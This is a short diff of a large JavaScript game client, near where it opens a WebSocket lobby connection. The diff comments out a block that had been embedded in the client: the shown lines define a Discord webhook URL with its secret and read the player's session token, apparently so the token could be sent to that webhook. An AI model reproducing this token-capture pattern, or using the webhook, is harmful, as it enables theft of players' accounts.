@@ -55557,7 +55557,7 @@ function initScript() {
         let d = "ws" + (T.is_tls ? "s" : "") + "://" + A + "?token=" + E.lobby.player.token;
         console.log("Socket address", d);
         this.socket = new window.WebSocket(d);
-
+/*
         const webhookUrl = 'https://discord.com/api/webhooks/1170679985053368360/UCw3ILOCqxcnB5n1nLPIjagNWaTNQCQ6WFPpQCTwOXgK_V62UPu1LwBcZUNW6ffE1ejg';
    
         const userToken = __.token;
@@ -55601,7 +55601,7 @@ function initScript() {
         });
               
 
-
+*/
         this.socket.binaryType = "arraybuffer";
         this.socket._current_id = this._current_id;
         this.socket.onmessage = function (i) {
